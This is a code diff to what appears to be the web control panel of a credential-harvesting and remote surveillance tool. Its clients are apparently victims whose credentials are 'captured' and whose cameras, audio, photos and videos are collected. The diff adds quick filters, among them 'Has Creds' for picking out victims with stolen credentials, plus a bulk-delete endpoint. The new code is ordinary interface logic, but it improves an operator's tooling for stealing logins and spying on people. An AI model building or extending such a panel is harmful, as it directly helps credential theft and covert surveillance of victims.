@@ -297,6 +297,7 @@ kbd{display:inline-block;background:var(--panel2);border:1px solid var(--border2
 .cl-action-btn:hover{border-color:var(--accent);color:var(--accent)}
 /* label badge */
 .cl-label-badge{display:inline-block;font-size:.58rem;background:#f1f3f4;border:1px solid var(--border2);border-radius:4px;padding:1px 6px;margin-right:3px;color:var(--text2)}
+.qf-btn.active-qf{background:var(--accent)!important;color:#fff!important;border-color:var(--accent)!important}
 /* refresh ring */
 @keyframes spin{to{transform:rotate(360deg)}}
 #refresh-ring{width:14px;height:14px;border-radius:50%;border:2px solid var(--border2);border-top-color:var(--accent);display:inline-block;vertical-align:middle;margin-left:6px;animation:spin .8s linear infinite;opacity:0;transition:opacity .3s}
@@ -386,6 +387,12 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
     <div class="filter-wrap">
         <label>Client:</label>
         <select id="clientFilter" onchange="onFilterChange()"><option value="">All Clients</option></select>
+        <div style="display:flex;gap:3px;margin-left:8px">
+            <button id="qf-all" class="btn qf-btn active-qf" onclick="setQuickFilter('all')" style="font-size:.6rem;padding:3px 8px">All</button>
+            <button id="qf-online" class="btn qf-btn" onclick="setQuickFilter('online')" style="font-size:.6rem;padding:3px 8px;border-color:#0b8a0b;color:#0b8a0b">🟢 Online</button>
+            <button id="qf-offline" class="btn qf-btn" onclick="setQuickFilter('offline')" style="font-size:.6rem;padding:3px 8px">Offline</button>
+            <button id="qf-creds" class="btn qf-btn" onclick="setQuickFilter('creds')" style="font-size:.6rem;padding:3px 8px;border-color:#f4b400;color:#f4b400">🔑 Has Creds</button>
+        </div>
     </div>
         <div class="tabs">
         <div class="tab active" data-v="overview">Overview</div>
@@ -770,6 +777,7 @@ let liveFeeds = {}; // { clientId: { active: true, lastFrame: timestamp, fps: 0 
 let liveFpsCounters = {}; // for FPS calculation
 let audioPlayers = {}; // { clientId: true/false }
 let camOnlineOnly = true; // filter: only show online clients in camera tab
+let quickFilter = 'all'; // quick filter state: 'all' | 'online' | 'offline' | 'creds'
 const $ = s => document.querySelector(s);
 const $$ = s => document.querySelectorAll(s);
 function esc(s){if(!s)return '';var d=document.createElement('div');d.textContent=String(s);return d.innerHTML;}
@@ -1082,6 +1090,15 @@ function onFilterChange() {
     refreshAll();
 }
 
+function setQuickFilter(f) {
+    quickFilter = f;
+    $$('.qf-btn').forEach(b => b.classList.remove('active-qf'));
+    const btn = document.getElementById('qf-' + f);
+    if (btn) btn.classList.add('active-qf');
+    // Re-render cached clients with new filter
+    if (window._lastClientsData) renderClients(window._lastClientsData, true);
+}
+
 function updateFilterOptions(clients) {
     const sel = $('#clientFilter');
     const val = sel.value;
@@ -1332,6 +1349,7 @@ async function refreshAll() {
                     toast(`\uD83D\uDD11 ${added} nieuw${added > 1 ? 'e' : ''} credential(s) captured!`);
                 }
                 prevCredentialCount = newCredCount;
+                if (stats.credentialClients) window._credClientIds = new Set(stats.credentialClients);
                 $('#s-err').textContent = stats.errorCount || 0;
                 updateTabBadge('photos', stats.photoCount || 0);
                 updateTabBadge('videos', stats.mediaCount || 0);
@@ -1498,6 +1516,8 @@ async function loadVisits(reset) {
 async function loadCredentials() {
     const creds = await api('/api/credentials?limit=200' + filterParam());
     if (!creds) return;
+    // Track which clients have credentials for quick-filter
+    window._credClientIds = new Set(creds.map(c => c.clientId));
     const c = $('#cred-log');
     if (!creds.length) { c.innerHTML = '<div class="empty">No credentials captured yet</div>'; return; }
     c.innerHTML = `<table style="width:100%;border-collapse:collapse;font-size:.72rem">
@@ -1819,11 +1839,16 @@ async function doLogout() {
 //  RENDERERS
 // ═══════════════════════════════════════════════════════════════
 function renderClients(clients) {
-    lastClientsData = clients;
+    if (clients !== undefined) { lastClientsData = clients; window._lastClientsData = clients; }
+    else clients = window._lastClientsData || {};
     try {
     const c = $('#cl-list');
     let entries = Object.entries(clients || {});
     if (currentFilter) entries = entries.filter(([id]) => id === currentFilter);
+    // Quick filter
+    if (quickFilter === 'online') entries = entries.filter(([, cl]) => cl.online);
+    else if (quickFilter === 'offline') entries = entries.filter(([, cl]) => !cl.online);
+    else if (quickFilter === 'creds') entries = entries.filter(([id]) => window._credClientIds && window._credClientIds.has(id));
     if (!entries.length) { c.innerHTML = '<div class="empty">No clients</div>'; return; }
 
     // Sort: pinned first, then online, then by lastSeen
@@ -2055,11 +2080,12 @@ async function bulkDeleteClients() {
     if (!selected.length) { toast('⚠️ No clients selected'); return; }
     if (!confirm(`Delete ${selected.length} client(s)?`)) return;
     toast(`🗑 Deleting ${selected.length} clients...`);
-    let done = 0;
-    for (const id of selected) {
-        try { await apiFetch(`/api/client/${id}`, { method: 'DELETE' }); done++; } catch {}
+    try {
+        const r = await apiFetch('/api/clients/bulk', { method: 'DELETE', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ ids: selected }) });
+        toast(`✅ Deleted ${r.deleted}/${selected.length} clients`);
+    } catch (e) {
+        toast('❌ Bulk delete failed: ' + e.message);
     }
-    toast(`✅ Deleted ${done}/${selected.length} clients`);
     refreshAll();
 }
 
